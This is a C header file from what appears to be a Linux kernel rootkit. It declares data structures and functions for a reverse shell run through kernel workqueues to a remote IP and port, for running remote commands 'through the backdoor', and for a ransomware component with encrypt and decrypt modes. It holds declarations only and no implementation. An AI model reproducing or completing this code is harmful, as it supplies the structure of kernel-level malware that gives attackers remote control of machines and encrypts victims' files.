#ifndef HEADER_UTILS
#define HEADER_UTILS
#include <linux/kernel.h>
#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/completion.h>


struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};

struct command_params {
	struct work_struct work;
	char* command;
};

typedef enum {
	RANSOM_ENCRYPT = 1,
	RANSOM_DECRYPT = 2,
}jolteon_module;


struct ransom_params {
	struct work_struct work;
	jolteon_module module;
	char* args;
};

/**
 * Auxiliary function called by the workqueue which starts the reverse shell
 */ 
void execute_reverse_shell(struct work_struct *work);

/**
 * Starts reverse shell using kernel workqueues, which will run asynchronously
 * @param ip remote IP address to bind
 * @param port remote port to bind
 * @return 0 if OK, 1 if error 
 */ 
int start_reverse_shell(char* ip, char* port);

/**
 * Execute remote code through the backdoor
 * @param cmd command to execute
 * @return 0 if OK, 1 if error 
 */ 
void execute_command(struct work_struct *work);
int run_cmd(char* cmd);

#endif